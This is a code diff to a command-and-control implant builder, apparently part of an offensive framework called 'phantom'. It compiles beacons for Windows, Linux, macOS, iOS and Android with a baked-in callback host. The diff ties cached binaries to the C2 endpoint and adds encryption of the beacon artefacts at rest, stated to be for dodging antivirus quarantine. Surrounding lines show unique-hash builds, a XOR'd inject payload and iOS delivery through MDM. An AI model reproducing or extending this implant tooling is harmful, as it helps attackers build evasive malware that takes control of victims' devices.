@@ -32,13 +32,28 @@ _PLATFORM_OUT = {
 }
 
 
-def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
-    """Return True if binary is missing or crypto keys changed since last build."""
+def _endpoint_key(host: str, port, use_ssl) -> str:
+    """The callback a binary is compiled for, as one comparable string.
+
+    It belongs in the rebuild fingerprint: the C2 host/port are BURNED into
+    `c2_config.h`, so a cached binary is only reusable while the endpoint is
+    the same. It used to be keyed on the crypto material alone, and the
+    consequence was exactly the failure this codebase keeps fixing elsewhere
+    — rebuild for a new host (a tunnel hostname, a new engagement) and the
+    builder answered "already built" and handed back the PREVIOUS binary,
+    which checked in to an address that no longer exists.
+    """
+    return f"{str(host or '').strip()}:{int(port or 0)}:{int(bool(use_ssl))}"
+
+
+def _needs_rebuild(beacon_dir: str, out_name: str,
+                   endpoint: str = "") -> bool:
+    """True if the binary is missing, or keys/endpoint changed since build."""
     beacon_out = os.path.join(beacon_dir, out_name)
     hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
     if not os.path.exists(beacon_out):
         return True
-    current = crypto_fingerprint()
+    current = crypto_fingerprint() + ("|" + endpoint if endpoint else "")
     if not os.path.exists(hash_file):
         return True
     try:
@@ -48,10 +63,10 @@ def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
         return True
 
 
-def _mark_built(beacon_dir: str, out_name: str) -> None:
+def _mark_built(beacon_dir: str, out_name: str, endpoint: str = "") -> None:
     hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
     with open(hash_file, "w", encoding="utf-8") as f:
-        f.write(crypto_fingerprint())
+        f.write(crypto_fingerprint() + ("|" + endpoint if endpoint else ""))
 
 
 def _xor_encrypt(data: bytes, key: int = _XOR_KEY) -> bytes:
@@ -317,7 +332,8 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
 
     beacon_out = os.path.join(beacon_dir, out_name)
 
-    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name):
+    _endpoint = _endpoint_key(host, port, use_ssl)
+    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name, _endpoint):
         return beacon_out
 
     # Generate dynamic build ID to ensure unique binary hash
@@ -734,7 +750,24 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                 except OSError:
                     pass
 
-            _mark_built(beacon_dir, out_name)
+            # ── Seal the plaintext artefacts ───────────────────────────
+            # beacon.pe / beacon.bin are content-signatured, and an on-access
+            # antivirus deletes them on the OPERATOR's machine the first time
+            # they are touched. Sealing keeps the exact same bytes available
+            # to the C2 (decrypted in memory when served) without leaving a
+            # quarantinable file in the build tree.
+            try:
+                from phantom.utils import beacon_artifacts
+                if beacon_artifacts.seal(beacon_pe) or \
+                        beacon_artifacts.seal(beacon_bin):
+                    console.print("[green][+] Artefacts sealed at rest "
+                                  "(.enc + random key; set "
+                                  "PHANTOM_KEEP_ARTIFACTS=1 to keep the "
+                                  "plaintext)[/green]")
+            except Exception as exc:          # sealing must never break a build
+                console.print(f"[yellow][!] Sealing skipped: {exc}[/yellow]")
+
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
             return beacon_bin
         except subprocess.CalledProcessError as e:
             notifier.error(f"Windows compilation failed:\n{e.stderr}")
@@ -798,7 +831,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                                    capture_output=True, text=True, timeout=600)
 
             _run(_build_cmd(static=False))
-            _mark_built(beacon_dir, out_name)
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
 
             # Static + XOR'd inject payload (deploy artifact)
             static_path = os.path.join(beacon_dir, static_name)
@@ -877,7 +910,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                 [compiler, "-std=c++20", "-O2", "-o", "beacon_macos",
                  *include_flags, "src/main.cpp", *link_flags],
                 cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
-            _mark_built(beacon_dir, out_name)
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"macOS compilation failed:\n{e.stderr}")
@@ -914,7 +947,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                  "-lssl", "-lcrypto"],
                 cwd=beacon_dir, check=True, capture_output=True, text=True,
                 timeout=1200)
-            _mark_built(beacon_dir, out_name)
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
             console.print("[green][+] iOS dylib built — push via MDM as an "
                           "enterprise-signed app payload.[/green]")
             return beacon_out
@@ -943,7 +976,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                  "-lssl", "-lcrypto", "-ldl"],
                 cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
             console.print("[green][+] Static libc++ linked — no runtime dependency on libc++_shared.so[/green]")
-            _mark_built(beacon_dir, out_name)
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"Android compilation failed:\n{e.stderr}")
